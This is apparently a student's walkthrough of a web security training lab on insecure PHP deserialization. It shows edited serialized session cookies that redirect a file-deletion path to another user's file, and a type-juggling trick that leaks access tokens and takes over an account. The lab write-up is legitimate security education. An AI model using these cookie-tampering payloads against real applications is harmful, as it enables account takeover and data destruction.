# Lab: Using application functionality to exploit insecure deserialization

 This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

You also have access to a backup account: gregg:rosebud

# Step 1 login to both accounts and inspect the session cookies

## wiener:

![image](https://user-images.githubusercontent.com/83407557/213541898-6dc8793e-a684-4e14-b61b-c6f2fa975b72.png)

**decoded session cookie**
```php
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"m53316fdyacd7p05an3d0fjtik2qa2ge";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

## gregg

![image](https://user-images.githubusercontent.com/83407557/213542102-ebc1bcec-f6ce-4b16-9ba7-e39d9a9631eb.png)


**decoded session cookie**
```php
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"m5f1hxr02n3901bj8tw7lvxufyc7g3v2";s:11:"avatar_link";s:18:"users/gregg/avatar";}
```


# Step 2 breaking down the cookies


The cookies are an object with a class that is 4-characters long called "User" `O:4:"User"` this class has three attributes:

1. a key of username with the value of the current username
2. a key of access_token with the value of current acces_token
3. a key of avatar_link with the value of the directory where the avatar is stored

# Step 3 Upload a new avatar to the gregg account and see how the cookie changes:

I change greggs avatar to a .png of a fruit:

![image](https://user-images.githubusercontent.com/83407557/213543372-d0af6ccd-5bd4-487d-89bf-01c132819c72.png)

I see that the avatar link stays the same:

![image](https://user-images.githubusercontent.com/83407557/213544362-54485173-861d-4048-aa6c-3e0854cff808.png)

# Step 4 Modify the session cookie to target the file I need to delete:

First I need to get to find the length of the string I want to use

Note in the cookie the value is 18:

```php
s:18:"users/gregg/avatar"
```
I can verify this with python:

```bash
└─$ python -c 'print(len("users/gregg/avatar"))'
18
```
Next I need to find the length of the target string:

```bash
└─$ python -c 'print(len("users/carlos/morale.txt"))'
23
```

Now I can modify the session cookie to target this instead:

```php
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"m5f1hxr02n3901bj8tw7lvxufyc7g3v2";s:11:"avatar_link";s:23:"users/carlos/morale.txt";}
```

# Step 5 delete gregg account, with the modified cookie:

I intercept the request to delete the account:

![image](https://user-images.githubusercontent.com/83407557/213545442-9e5c1678-97e5-4cfb-a29f-a6fc27926e25.png)


And modify the cookie:



![image](https://user-images.githubusercontent.com/83407557/213545599-ec63a3e5-7c44-4eda-b735-a4620f18ef0a.png)

This deleted the gregg account, but didn't solve the lab.

# Step 6 see if I can get to the carlos' my-account by changing data-type

This time, I take the cookie for the wiener session:

```php
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"m53316fdyacd7p05an3d0fjtik2qa2ge";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

and see if I can get to the carlos account by changing the data-type of the access_token:

```php
O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";i:0;s:11:"avatar_link";s:19:"users/carlos/avatar";}
```

This causes an error that leaks all the access tokens:

![image](https://user-images.githubusercontent.com/83407557/213546865-1efe1067-148d-42ba-a2e5-1c35010720c4.png)

so now I think I have carlos' access token:

```php
$access_tokens = [
o28hwm9afnj2mvpgofvluzyqhuz3ijzq, 
m5f1hxr02n3901bj8tw7lvxufyc7g3v2, 
m53316fdyacd7p05an3d0fjtik2qa2ge
]
```
Again, I need to get the length:

```bash
└─$ python -c 'print(len("o28hwm9afnj2mvpgofvluzyqhuz3ijzq"))'
32
```

Now I edit the cookie again:

```php
O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"o28hwm9afnj2mvpgofvluzyqhuz3ijzq";s:11:"avatar_link";s:19:"users/carlos/avatar";}
```

And modify the request for my-account:

![image](https://user-images.githubusercontent.com/83407557/213548060-7c0b36e7-6b1c-4d84-94ed-7a8634180aea.png)


And find that I can get into carlos' account:

![image](https://user-images.githubusercontent.com/83407557/213548167-f6abe5b0-cb50-4013-8d6c-68d68485a429.png)

# Step 7 update cookie with access_token and target file:

![image](https://user-images.githubusercontent.com/83407557/213548728-5c1f16c7-eeae-4dce-944d-c13f2a5a49fc.png)

And get a new error:

![image](https://user-images.githubusercontent.com/83407557/213549023-e8514a53-95f6-4b98-869e-9fe7ad1a20a6.png)

So I guess I can't delete the carlos account, I will instead delete wiener but with the carlos access token:

![image](https://user-images.githubusercontent.com/83407557/213549614-1a2c1b9a-1285-4ae0-aa6c-6f01e87f6c43.png)

Then I realized that I was foolishly trying to delete a file in the wrong directory:

![image](https://user-images.githubusercontent.com/83407557/213550310-8b2162a9-7768-4ae3-b952-083793d2a447.png)

Which solves the lab:

![image](https://user-images.githubusercontent.com/83407557/213550388-9b1a3c35-71cb-4c79-8cdd-e3b950e70f51.png)

Even though I made several mistakes, I feel like I gained some nice insights via the error messages, and got into an account that I wasn't even meant to. Happy hacking ; P
